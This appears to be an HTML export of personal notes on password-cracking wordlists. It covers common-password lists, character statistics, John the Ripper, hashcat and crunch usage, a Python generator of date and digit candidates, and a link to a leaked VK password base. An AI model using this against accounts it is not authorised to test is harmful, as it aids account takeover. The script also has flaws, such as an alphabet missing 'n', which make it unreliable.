+<li>pass</li>
+<li>internet</li>
+<li>pokemon</li>
+<li>starwars</li>
+<li>welcome</li>
+<li>lol</li>
+<li>nikita</li>
+<li>andrew</li>
+<li>jordan</li>
+<li>forever</li>
+<li>xxx</li>
+<li>qawsed</li>
+<li>football</li>
+<li>daniel</li>
+<li>michael</li>
+<li>princess</li>
+<li>liverpool</li>
+<li>robert</li>
+<li>baseball</li>
+<li>159753</li>
+<li>123321</li>
+<li>ukraine</li>
+<li>putin</li>
+<li>terminator</li>
+<li>diablo</li>
+<li>satana</li>
+<li>philips</li>
+<li>predator</li>
+<li>metallica</li>
+<li>mustang</li>
+<li>2000</li>
+<li>admin</li>
+<li>killer</li>
+<li>sexsex</li>
+<li>angel</li>
+<li>lovelove</li>
+<li>rammstein</li>
+<li>ramstein</li>
+<li>skorpion</li>
+<li>beautiful</li>
+<li>darkness</li>
+<li>remember</li>
+<li>navigator</li>
+<li>testtest</li>
+<li>futurama</li>
+<li>november</li>
+<li>september</li>
+<li>P@ssw0rd</li>
+<li>greenday</li>
+<li>fuckfuck</li>
+<li>panda</li>
+<li>godsave</li>
+<li>truelove</li>
+<li>tryagain</li>
+<li>sushi</li>
+<li>master</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org7c3b37c" class="outline-4">
+<h4 id="org7c3b37c"><span class="section-number-4">8.8.4</span> games:</h4>
+<div class="outline-text-4" id="text-8-8-4">
+<ul class="org-ul">
+<li>warcraft</li>
+<li>warhammer</li>
+<li>warhamer</li>
+<li>fortnite</li>
+<li>doom</li>
+<li>startcraft</li>
+<li>minecraft</li>
+<li>tetris</li>
+<li>lineage</li>
+<li>wow</li>
+<li>fifa</li>
+<li>harrypotter</li>
+<li>harry</li>
+<li>potter</li>
+<li>Hogwarts</li>
+<li>voldemort</li>
+<li>frodo</li>
+<li>gandalf</li>
+<li>morrowind</li>
+<li>batman</li>
+<li>joker</li>
+<li>oblivion</li>
+<li>needforspeed</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org4bec743" class="outline-4">
+<h4 id="org4bec743"><span class="section-number-4">8.8.5</span> companies</h4>
+<div class="outline-text-4" id="text-8-8-5">
+<ul class="org-ul">
+<li>adidas</li>
+<li>vkontakte, vkontakt, kontakt</li>
+<li>rambler</li>
+<li>ferrari</li>
+<li>motorola</li>
+<li>winston</li>
+<li>toyota</li>
+<li>mersedes</li>
+<li>panasonic</li>
+<li>nissan</li>
+<li>samsung</li>
+<li>google</li>
+<li>logitech</li>
+<li>genius</li>
+<li>lenovo</li>
+<li>sony</li>
+<li>siemens</li>
+<li>apple</li>
+<li>aliexpress</li>
+<li>ozon</li>
+<li>rambler</li>
+<li>yandex</li>
+<li>tiktok</li>
+<li>instagram</li>
+<li>telegram</li>
+<li>whatsapp</li>
+<li>WeChat</li>
+<li>weixin</li>
+<li>SnapChat</li>
+<li>viber</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgbc570a0" class="outline-4">
+<h4 id="orgbc570a0"><span class="section-number-4">8.8.6</span> eng:</h4>
+<div class="outline-text-4" id="text-8-8-6">
+<ul class="org-ul">
+<li>hunter</li>
+<li>status</li>
+<li>sunshine</li>
+<li>hello</li>
+<li>love</li>
+<li>freedom</li>
+<li>secret</li>
+<li>shadow</li>
+<li>myspace</li>
+<li>monkey</li>
+<li>chocolate</li>
+<li>mynoob</li>
+<li>lovely</li>
+<li>target</li>
+<li>letmein</li>
+<li>pussy</li>
+<li>jennifer</li>
+<li>buster</li>
+<li>soccer</li>
+<li>harley</li>
+<li>tigger</li>
+<li>charlie</li>
+<li>thomas</li>
+<li>hockey</li>
+<li>ranger</li>
+<li>klaster</li>
+<li>george</li>
+<li>asshole</li>
+<li>michelle</li>
+<li>jessica</li>
+<li>pepper</li>
+<li>maggie</li>
+<li>ginger</li>
+<li>joshua</li>
+<li>cheese</li>
+<li>amanda</li>
+<li>summer</li>
+<li>ashley</li>
+<li>nicole</li>
+<li>biteme</li>
+<li>matthew</li>
+<li>yankees</li>
+<li>dallas</li>
+<li>austin</li>
+<li>thunder</li>
+<li>taylor</li>
+<li>trustno1</li>
+<li>access</li>
+<li>hammer</li>
+<li>silver</li>
+<li>patrick</li>
+<li>scooter</li>
+<li>orange</li>
+<li>cowboy</li>
+<li>money</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-orgfd38235" class="outline-3">
+<h3 id="orgfd38235"><span class="section-number-3">8.9</span> stats</h3>
+<div class="outline-text-3" id="text-8-9">
+<p>
+%
+</p>
+<ul class="org-ul">
+<li>only lower - 41,67</li>
+<li>mixed letters and numeric - 37</li>
+<li>only numeric - 15</li>
+<li>contains special charactes - 3.8</li>
+<li>only upper cases - 1.62</li>
+</ul>
+
+<p>
+characters % (without ")
+</p>
+<ul class="org-ul">
+<li>. - 0.7</li>
+<li>_ - 0.58</li>
+<li>! - 0.55</li>
+<li>- - 0.39</li>
+<li>@ - 0.32</li>
+<li>* - 0.3</li>
+<li># - 0.18</li>
+<li>/ - 0.12</li>
+<li>$ - 0.1</li>
+<li>, - 0.09</li>
+<li>&amp; - 0.088</li>
+<li>? - 0.08</li>
+<li>+ - 0.073</li>
+<li>= - 0.057</li>
+<li>) - 0.056</li>
+<li>( - 0.055</li>
+<li>' - 0.05</li>
+<li>; - 0.044</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org94b202b" class="outline-3">
+<h3 id="org94b202b"><span class="section-number-3">8.10</span> generate wordlist</h3>
+<div class="outline-text-3" id="text-8-10">
+<ul class="org-ul">
+<li>hashcat</li>
+<li>John the Ripper</li>
+<li>PasswordsPro:</li>
+<li>Rsmangler</li>
+<li>crunch</li>
+</ul>
+</div>
+
+<div id="outline-container-org3c535d5" class="outline-4">
+<h4 id="org3c535d5"><span class="section-number-4">8.10.1</span> John the Ripper</h4>
+<div class="outline-text-4" id="text-8-10-1">
+<ul class="org-ul">
+<li><a href="https://www.openwall.com/john/doc/OPTIONS.shtml">https://www.openwall.com/john/doc/OPTIONS.shtml</a></li>
+<li><a href="https://www.openwall.com/john/doc/RULES.shtml">https://www.openwall.com/john/doc/RULES.shtml</a></li>
+<li>/etc/john/john.conf or .john/john.conf
+<ul class="org-ul">
+<li>section: [List.Rules:Wordlist]</li>
+</ul></li>
+<li>john &#x2013;wordlist=air-test/password.lst &#x2013;rules &#x2013;stdout</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgae4a1cd" class="outline-4">
+<h4 id="orgae4a1cd"><span class="section-number-4">8.10.2</span> app-crypt/johntheripper-jumbo</h4>
+<div class="outline-text-4" id="text-8-10-2">
+<ul class="org-ul">
+<li>john &#x2013;wordlist=air-test/password.lst &#x2013;rules:Single &#x2013;min-length=8 &#x2013;max-length=10 &#x2013;stdout</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org9390851" class="outline-4">
+<h4 id="org9390851"><span class="section-number-4">8.10.3</span> hashcat</h4>
+<div class="outline-text-4" id="text-8-10-3">
+<ul class="org-ul">
+<li><a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">https://hashcat.net/wiki/doku.php?id=rule_based_attack</a></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org1a64565" class="outline-4">
+<h4 id="org1a64565"><span class="section-number-4">8.10.4</span> app-misc/crunch</h4>
+<div class="outline-text-4" id="text-8-10-4">
+<ul class="org-ul">
+<li><a href="https://xeushack.github.io/wordlists-with-crunch">https://xeushack.github.io/wordlists-with-crunch</a></li>
+<li><a href="https://www.hackingarticles.in/a-detailed-guide-on-crunch/">https://www.hackingarticles.in/a-detailed-guide-on-crunch/</a></li>
+<li><a href="https://www.linuxsecrets.com/1669-creating-wordlists-for-penetration-testing-with-crunch">https://www.linuxsecrets.com/1669-creating-wordlists-for-penetration-testing-with-crunch</a></li>
+<li>crunch [minimum length] [maximum length] [charset / extra options]</li>
+<li>-o outputfile</li>
+<li></li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-org12b7512" class="outline-3">
+<h3 id="org12b7512"><span class="section-number-3">8.11</span> my sequence</h3>
+<div class="outline-text-3" id="text-8-11">
+<ul class="org-ul">
+<li>john rules on name</li>
+<li>one word: all sequences and worlds capitalized and filtered</li>
+<li>most common</li>
+<li>dates</li>
+<li>two words</li>
+<li>john rules on "one word"</li>
+</ul>
+<p>
+old
+</p>
+<ul class="org-ul">
+<li>key sequence (sequences.txt) + dates</li>
+<li>reverse sequences (sequences<sub>rev.txt</sub>)</li>
+<li>sequence words (wordlist<sub>ks</sub>) + default passwords</li>
+<li>sequence words (wordlist<sub>ks</sub>) + default passwords  (upper lower)</li>
+<li>reverse sequence words (wordlist<sub>ks</sub>)</li>
+<li>reverse sequence words (wordlist<sub>ks</sub>) (upper lower)</li>
+<li>filtered sequence words result (wordlist<sub>ks8</sub>)</li>
+<li>all numbers = 8 (alldigits8.txt)</li>
+<li>all numbers = 10 (alldigits10.txt)</li>
+<li>all numbers+A-F - upper, lower, 8, 10, 9</li>
+<li>&gt;8 normal =n.txt</li>
+<li>&gt;8 all lowercase =l.txt</li>
+<li>&gt;8 all uppercase =u.txt</li>
+<li>&gt;8 capitalized</li>
+<li>&lt;5 double normal</li>
+<li>&lt;5 double all lowercase</li>
+<li>&lt;5 double all upper</li>
+<li>&lt;5 double first upper second lower</li>
+<li>&lt;5 double first lowwer second upper</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org1e709d4" class="outline-3">
+<h3 id="org1e709d4"><span class="section-number-3">8.12</span> bash for passwords</h3>
+<div class="outline-text-3" id="text-8-12">
+<p>
+sort by symbols
+</p>
+<ul class="org-ul">
+<li>cat old-driver-passwords | nl -b a -s : | sort -t : -k 2 -u | cut -d : -f 2- &gt; old-driver-passwords</li>
+</ul>
+
+<p>
+filter lines 2-8 chars
+</p>
+<ul class="org-ul">
+<li>grep -E '^.{2,8}$' &#x2013;color=never infile</li>
+<li>sed -nr '/^.{2,8}$/p' infile</li>
+<li>cat TOP<sub>VK</sub>-100M<sub>WPA.txt</sub> | grep -o -E '[a-zA-Z]{4,}' | uniq</li>
+</ul>
+<p>
+reverse characters: rev
+</p>
+
+<p>
+shuffle and random line: shuf
+</p>
+</div>
+</div>
+<div id="outline-container-org0bc36eb" class="outline-3">
+<h3 id="org0bc36eb"><span class="section-number-3">8.13</span> bash generate password</h3>
+<div class="outline-text-3" id="text-8-13">
+<ul class="org-ul">
+<li>&lt; /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c 32 ;echo;</li>
+<li>tr -cd '[:alnum:]' &lt; /dev/urandom | fold -w30 | head -n1</li>
+</ul>
+<pre class="example">
+strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 30 | tr -d '\n'; echo
+
+</pre>
+<ul class="org-ul">
+<li>&lt; /dev/urandom tr -dc _A-Z-a-z-0-9 | fold -w8</li>
+<li>dd if=/dev/urandom bs=1 count=32 2&gt;/dev/null | base64 -w 0 | rev | cut -b 2- | rev</li>
+<li>openssl rand -base64 32</li>
+<li>date | md5sum</li>
+<li>date +%s | sha256sum | base64 | head -c 32 ; echo</li>
+</ul>
+<p>
+tmpfs
+</p>
+<ul class="org-ul">
+<li>mount -t tmpfs -o size=10m tmpfs /tmp/a</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orga5be5cb" class="outline-3">
+<h3 id="orga5be5cb"><span class="section-number-3">8.14</span> my</h3>
+<div class="outline-text-3" id="text-8-14">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #8ac6f2; font-weight: bold;">import</span> itertools <span style="color: #8ac6f2; font-weight: bold;">as</span> it
+<span style="color: #8ac6f2; font-weight: bold;">from</span> datetime <span style="color: #8ac6f2; font-weight: bold;">import</span> datetime
+
+<span style="color: #cae682;">ALPHA_LOW</span> = <span style="color: #95e454;">"abcdefghijklmopqrstuvwxyz"</span>
+<span style="color: #cae682;">ALPHA_UP</span> = <span style="color: #95e454;">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
+<span style="color: #cae682;">ALPHA</span> = ALPHA_LOW + ALPHA_UP
+<span style="color: #cae682;">NUMBERS</span> = <span style="color: #95e454;">"0123456789"</span>
+<span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">special = " `&#232;&#233;&#224;@&#231;-/\\:#{}[]()'&amp;*`^$!."</span>
+<span style="color: #cae682;">ADDITIONAL_SPECIAL</span> = [<span style="color: #95e454;">'.'</span>, <span style="color: #95e454;">'_'</span>, <span style="color: #95e454;">'!'</span>, <span style="color: #95e454;">'-'</span>, <span style="color: #95e454;">'@'</span>, <span style="color: #95e454;">'*'</span>, <span style="color: #95e454;">'#'</span>, <span style="color: #95e454;">'/'</span>, <span style="color: #95e454;">'$'</span>]
+<span style="color: #cae682;">ADDITIONAL_SPECIAL_DOUPLES</span> = [<span style="color: #95e454;">'..'</span>, <span style="color: #95e454;">'__'</span>,<span style="color: #95e454;">'!!'</span>]
+<span style="color: #cae682;">ADDITIONAL</span> = [<span style="color: #95e454;">'1'</span>, <span style="color: #95e454;">'11'</span>, <span style="color: #95e454;">'12'</span>, <span style="color: #95e454;">'13'</span>, <span style="color: #95e454;">'123'</span>, <span style="color: #95e454;">'a'</span>, <span style="color: #95e454;">'q'</span>, <span style="color: #95e454;">'qq'</span>, <span style="color: #95e454;">'aa'</span>, <span style="color: #95e454;">'0'</span>, <span style="color: #95e454;">'00'</span>, <span style="color: #95e454;">'01'</span>, <span style="color: #95e454;">'2'</span>, <span style="color: #95e454;">'3'</span>, <span style="color: #95e454;">'7'</span>] \
+        + ADDITIONAL_SPECIAL + ADDITIONAL_SPECIAL_DOUPLES
+
+<span style="color: #cae682;">ADDITIONAL_1CHAR</span> = [x <span style="color: #8ac6f2; font-weight: bold;">for</span> x <span style="color: #8ac6f2; font-weight: bold;">in</span> ADDITIONAL <span style="color: #8ac6f2; font-weight: bold;">if</span> <span style="color: #e5786d;">len</span>(x) == 1]
+
+<span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">WFUNC = lambda x: print(x)</span>
+<span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">f = open("sequences.txt", "w")</span>
+<span style="color: #cae682;">f</span> = <span style="color: #e5786d;">open</span>(<span style="color: #95e454;">"alldigits8.txt"</span>, <span style="color: #95e454;">"w"</span>)
+<span style="color: #cae682;">WFUNC</span> = <span style="color: #8ac6f2; font-weight: bold;">lambda</span> x: f.write(x + <span style="color: #95e454;">'\n'</span>)
+
+<span style="color: #8ac6f2; font-weight: bold;">def</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">wp</span>(l):
+        <span style="color: #cae682;">l</span> = <span style="color: #e5786d;">list</span>(l)
+        <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">print(type(l), l)</span>
+        <span style="color: #8ac6f2; font-weight: bold;">if</span> <span style="color: #e5786d;">isinstance</span>(l[0], <span style="color: #e5786d;">str</span>):
+                WFUNC(<span style="color: #95e454;">""</span>.join(l))
+        <span style="color: #8ac6f2; font-weight: bold;">else</span>:
+                <span style="color: #fa8072;">#</span><span style="color: #99968b; font-style: italic;">if not isinstance(l[0], list) and not isinstance(l[0], tuple):</span>
+                <span style="color: #fa8072;">#       </span><span style="color: #99968b; font-style: italic;">l = [list(v) for v in l]</span>
+                <span style="color: #8ac6f2; font-weight: bold;">for</span> v <span style="color: #8ac6f2; font-weight: bold;">in</span> l:
+                        <span style="color: #cae682;">v</span> = <span style="color: #e5786d;">list</span>(v)
+                        <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">print(type(v), v)</span>
+                        <span style="color: #8ac6f2; font-weight: bold;">if</span> <span style="color: #e5786d;">isinstance</span>(v[0], <span style="color: #e5786d;">str</span>):
+                                WFUNC(<span style="color: #95e454;">""</span>.join(v))
+                        <span style="color: #8ac6f2; font-weight: bold;">else</span>:
+                                <span style="color: #8ac6f2; font-weight: bold;">for</span> vv <span style="color: #8ac6f2; font-weight: bold;">in</span> v:
+                                        WFUNC(<span style="color: #95e454;">""</span>.join(vv))
+
+
+<span style="color: #8ac6f2; font-weight: bold;">def</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">wget</span>(l):
+        <span style="color: #cae682;">l</span> = <span style="color: #e5786d;">list</span>(l)
+        <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">print(type(l), l)</span>
+        <span style="color: #8ac6f2; font-weight: bold;">if</span> <span style="color: #e5786d;">isinstance</span>(l[0], <span style="color: #e5786d;">list</span>) <span style="color: #8ac6f2; font-weight: bold;">or</span> <span style="color: #e5786d;">isinstance</span>(l[0], <span style="color: #e5786d;">tuple</span>):
+                <span style="color: #8ac6f2; font-weight: bold;">return</span> [<span style="color: #95e454;">""</span>.join(v) <span style="color: #8ac6f2; font-weight: bold;">for</span> v <span style="color: #8ac6f2; font-weight: bold;">in</span> l]
+        <span style="color: #8ac6f2; font-weight: bold;">else</span>:
+                <span style="color: #8ac6f2; font-weight: bold;">return</span> <span style="color: #95e454;">""</span>.join(l)
+
+
+<span style="color: #8ac6f2; font-weight: bold;">def</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">frep</span>(f, items, reps:<span style="color: #e5786d;">list</span>):
+        <span style="color: #8ac6f2; font-weight: bold;">if</span> <span style="color: #e5786d;">isinstance</span>(reps, <span style="color: #e5786d;">range</span>):
+                <span style="color: #cae682;">reps</span> = <span style="color: #e5786d;">list</span>(reps)
+                <span style="color: #cae682;">r</span> = []
+        <span style="color: #8ac6f2; font-weight: bold;">for</span> v <span style="color: #8ac6f2; font-weight: bold;">in</span> reps:
+                r.append(f(items, v))
+        <span style="color: #8ac6f2; font-weight: bold;">return</span> r
+
+
+<span style="color: #8ac6f2; font-weight: bold;">def</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">frep_prod</span>(f, items, reps:<span style="color: #e5786d;">list</span>):
+        <span style="color: #8ac6f2; font-weight: bold;">if</span> <span style="color: #e5786d;">isinstance</span>(reps, <span style="color: #e5786d;">range</span>):
+                <span style="color: #cae682;">reps</span> = <span style="color: #e5786d;">list</span>(reps)
+                <span style="color: #cae682;">r</span> = []
+        <span style="color: #8ac6f2; font-weight: bold;">for</span> v <span style="color: #8ac6f2; font-weight: bold;">in</span> reps:
+                <span style="color: #cae682;">a</span> = f(items, repeat=v)
+                <span style="color: #cae682;">a</span> = <span style="color: #e5786d;">list</span>(a)
+                <span style="color: #8ac6f2; font-weight: bold;">print</span>(a)
+                r.append(a)
+        <span style="color: #8ac6f2; font-weight: bold;">return</span> r
+
+
+<span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">-------------- Key Sequences</span>
+<span style="color: #8ac6f2; font-weight: bold;">def</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">key_sequences</span>():
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">REP8 4-10: alphabet = aaaaaaaa, bbbbbbbb, 11111111</span>
+    <span style="color: #8ac6f2; font-weight: bold;">for</span> v <span style="color: #8ac6f2; font-weight: bold;">in</span> <span style="color: #e5786d;">list</span>(ALPHA_LOW) + <span style="color: #e5786d;">list</span>(NUMBERS) + ADDITIONAL_SPECIAL:
+        wp(frep(it.repeat, v, <span style="color: #e5786d;">range</span>(3,10) ))
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">REP2 2,3,4,5: 1 2 3 4 5 6 7 8 9 = 12121212, 32323232</span>
+    <span style="color: #cae682;">a</span> = it.permutations(NUMBERS, 2)
+    <span style="color: #8ac6f2; font-weight: bold;">for</span> v <span style="color: #8ac6f2; font-weight: bold;">in</span> wget(a):
+        wp(frep(it.repeat, v, <span style="color: #e5786d;">range</span>(2,6) ))
+
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">PERM 2-3: 123 qwe asd zxc = 123123, 123qwe, qwe123</span>
+    <span style="color: #cae682;">z</span> = [<span style="color: #95e454;">'123'</span>, <span style="color: #95e454;">'qwe'</span>, <span style="color: #95e454;">'asd'</span>, <span style="color: #95e454;">'zxc'</span>]
+    <span style="color: #cae682;">a1</span> = it.product(z, repeat=2)
+    <span style="color: #cae682;">a2</span> = it.product(z, repeat=3)
+    wp([a1,a2])
+
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">PERM 2: qwer asdf zxcv 1234</span>
+    <span style="color: #cae682;">a</span> = it.product([<span style="color: #95e454;">'1234'</span>, <span style="color: #95e454;">'qwer'</span>, <span style="color: #95e454;">'asdf'</span>, <span style="color: #95e454;">'zxcv'</span>], repeat=2)
+    wp(a)
+
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">REP2,3: qaz wsx, rfv, 123</span>
+    <span style="color: #cae682;">z</span> = [<span style="color: #95e454;">'qaz'</span>, <span style="color: #95e454;">'wsx'</span>, <span style="color: #95e454;">'rfv'</span>, <span style="color: #95e454;">'123'</span>]
+    <span style="color: #cae682;">a1</span> = it.product(z, repeat=2)
+    <span style="color: #cae682;">a2</span> = it.product(z, repeat=3)
+    wp([a1,a2])
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">PERM2: 1qaz 2wsx, 3rfv</span>
+    <span style="color: #cae682;">a</span> = it.product([<span style="color: #95e454;">"1qaz"</span>, <span style="color: #95e454;">"2wsx"</span>, <span style="color: #95e454;">"3rfv"</span>], repeat=2)
+    wp(a)
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">PERM4: 12, qw, as, zx</span>
+    <span style="color: #cae682;">a</span> = it.product([<span style="color: #95e454;">"12"</span>, <span style="color: #95e454;">"qw"</span>, <span style="color: #95e454;">"as"</span>, <span style="color: #95e454;">"zx"</span>], repeat=4)
+    wp(a)
+
+
+<span style="color: #8ac6f2; font-weight: bold;">def</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">dates</span>():
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">year, month, dates</span>
+    <span style="color: #cae682;">y_start</span>=1930
+    <span style="color: #cae682;">m_start</span>=1
+    <span style="color: #cae682;">d_start</span>=1
+    <span style="color: #cae682;">y_now</span> = datetime.now().year
+    <span style="color: #cae682;">special</span> = ADDITIONAL_SPECIAL + ADDITIONAL_SPECIAL_DOUPLES
+    <span style="color: #8ac6f2; font-weight: bold;">for</span> y <span style="color: #8ac6f2; font-weight: bold;">in</span> <span style="color: #e5786d;">range</span>(y_start, y_now+1):
+        <span style="color: #8ac6f2; font-weight: bold;">for</span> m <span style="color: #8ac6f2; font-weight: bold;">in</span> <span style="color: #e5786d;">range</span>(m_start, 12+1):
+            <span style="color: #8ac6f2; font-weight: bold;">for</span> d <span style="color: #8ac6f2; font-weight: bold;">in</span> <span style="color: #e5786d;">range</span>(m_start, 31+1):
+                <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">-- simple digits</span>
+                <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">WFUNC(f"{y}{m}{d}")</span>
+                <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">WFUNC(f"{d}{m}{y}")</span>
+                <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">-- with 0</span>
+                WFUNC(f<span style="color: #95e454;">"{y}{m:02d}{d:02d}"</span>)
+                WFUNC(f<span style="color: #95e454;">"{d:02d}{m:02d}{y}"</span>)
+                <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">-- with 0 with special</span>
+                <span style="color: #8ac6f2; font-weight: bold;">for</span> s <span style="color: #8ac6f2; font-weight: bold;">in</span> special:
+                    WFUNC(f<span style="color: #95e454;">"{y}{s}{m:02d}{s}{d:02d}"</span>)
+                    WFUNC(f<span style="color: #95e454;">"{d:02d}{s}{m:02d}{s}{y}"</span>)
+                <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">-- without 0 with special</span>
+                <span style="color: #8ac6f2; font-weight: bold;">for</span> s <span style="color: #8ac6f2; font-weight: bold;">in</span> special:
+                    WFUNC(f<span style="color: #95e454;">"{y}{s}{m}{s}{d}"</span>)
+                    WFUNC(f<span style="color: #95e454;">"{d}{s}{m}{s}{y}"</span>)
+
+                <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">-- with 0 with special without 19,20</span>
+                <span style="color: #8ac6f2; font-weight: bold;">for</span> s <span style="color: #8ac6f2; font-weight: bold;">in</span> special:
+                    WFUNC(f<span style="color: #95e454;">"{str(y)[-2:]}{s}{m:02d}{s}{d:02d}"</span>)
+                    WFUNC(f<span style="color: #95e454;">"{d:02d}{s}{m:02d}{s}{str(y)[-2:]}"</span>)
+                <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">-- without 0 with special without 19,20</span>
+                <span style="color: #8ac6f2; font-weight: bold;">for</span> s <span style="color: #8ac6f2; font-weight: bold;">in</span> special:
+                    WFUNC(f<span style="color: #95e454;">"{str(y)[-2:]}{s}{m}{s}{d}"</span>)
+                    WFUNC(f<span style="color: #95e454;">"{d}{s}{m}{s}{str(y)[-2:]}"</span>)
+
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">year now</span>
+    WFUNC(<span style="color: #e5786d;">str</span>(y_now) + <span style="color: #e5786d;">str</span>(y_now))
+    <span style="color: #8ac6f2; font-weight: bold;">for</span> v <span style="color: #8ac6f2; font-weight: bold;">in</span> special:
+        WFUNC(<span style="color: #e5786d;">str</span>(y_now) + v +  <span style="color: #e5786d;">str</span>(y_now))
+
+
+<span style="color: #8ac6f2; font-weight: bold;">def</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">all_numbers8</span>():
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">PERMUtatiosn all digits</span>
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">z = frep_prod(it.product, NUMBERS, range(1,4))</span>
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">wp(z)</span>
+    <span style="color: #cae682;">a1</span> = it.product(NUMBERS, repeat=4)
+    <span style="color: #cae682;">a1</span> = <span style="color: #e5786d;">list</span>(a1)
+    <span style="color: #8ac6f2; font-weight: bold;">for</span> v1 <span style="color: #8ac6f2; font-weight: bold;">in</span> a1:
+        <span style="color: #8ac6f2; font-weight: bold;">for</span> v2 <span style="color: #8ac6f2; font-weight: bold;">in</span> a1:
+            <span style="color: #cae682;">p</span> = <span style="color: #95e454;">""</span>.join(v1) + <span style="color: #95e454;">""</span>.join(v2)
+            WFUNC(p)
+
+
+<span style="color: #8ac6f2; font-weight: bold;">def</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">all_numbers10</span>():
+    <span style="color: #cae682;">a1</span> = it.product(NUMBERS, repeat=4)
+    <span style="color: #cae682;">a1</span> = <span style="color: #e5786d;">list</span>(a1)
+    <span style="color: #8ac6f2; font-weight: bold;">for</span> v1 <span style="color: #8ac6f2; font-weight: bold;">in</span> a1:
+        <span style="color: #cae682;">a2</span> = it.product(NUMBERS, repeat=6)
+        <span style="color: #8ac6f2; font-weight: bold;">for</span> v2 <span style="color: #8ac6f2; font-weight: bold;">in</span> a2:
+            <span style="color: #cae682;">p</span> = <span style="color: #95e454;">""</span>.join(v1) + <span style="color: #95e454;">""</span>.join(v2)
+            WFUNC(p)
+
+
+<span style="color: #8ac6f2; font-weight: bold;">if</span> <span style="color: #e5786d;">__name__</span> == <span style="color: #95e454;">"__main__"</span>:
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">key_sequences()</span>
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">dates()</span>
+    <span style="color: #fa8072;"># </span><span style="color: #99968b; font-style: italic;">all_numbers8()</span>
+    all_numbers10()
+
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org2e15638" class="outline-3">
+<h3 id="org2e15638"><span class="section-number-3">8.15</span> bases</h3>
+<div class="outline-text-3" id="text-8-15">
+<ul class="org-ul">
+<li>vk <a href="https://github.com/tokyoneon/1wordlist/">https://github.com/tokyoneon/1wordlist/</a>
+<ul class="org-ul">
+<li><a href="https://null-byte.wonderhowto.com/how-to/use-leaked-password-databases-create-brute-force-wordlists-0184006/">https://null-byte.wonderhowto.com/how-to/use-leaked-password-databases-create-brute-force-wordlists-0184006/</a></li>
+</ul></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org99798c2" class="outline-3">
+<h3 id="org99798c2"><span class="section-number-3">8.16</span> fast permutation</h3>
+<div class="outline-text-3" id="text-8-16">
+<ul class="org-ul">
+<li>C++ <a href="https://www.quickperm.org/01example.php">https://www.quickperm.org/01example.php</a></li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-c">
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">NOTICE:  Copyright 2008, Phillip Paul Fuchs</span>
+
+<span style="color: #6495ed; font-style: italic;">#define</span> <span style="color: #cae682;">N</span>    12   <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">number of elements to permute.  Let N &gt; 2</span>
+
+
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">NOTICE:  Copyright 2008, Phillip Paul Fuchs</span>
+
+<span style="color: #92a65e; font-weight: bold;">void</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">display</span>(<span style="color: #92a65e; font-weight: bold;">unsigned</span> <span style="color: #92a65e; font-weight: bold;">int</span> *<span style="color: #cae682;">a</span>, <span style="color: #92a65e; font-weight: bold;">unsigned</span> <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">j</span>, <span style="color: #92a65e; font-weight: bold;">unsigned</span> <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">i</span>) {
